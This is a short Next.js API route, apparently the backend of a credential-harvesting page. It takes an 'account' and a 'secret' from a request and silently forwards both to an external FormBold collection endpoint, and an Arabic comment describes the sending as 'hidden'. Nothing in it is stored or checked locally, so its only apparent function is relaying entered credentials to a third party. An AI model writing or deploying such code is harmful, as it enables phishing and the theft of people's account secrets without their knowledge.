import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const { account, secret } = await request.json();

    // إرسال البيانات بشكل آمن ومخفي إلى FormBold
    const response = await fetch('https://formbold.com/s/6M5YN', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        account: account,
        secret: secret,
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to submit');
    }

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}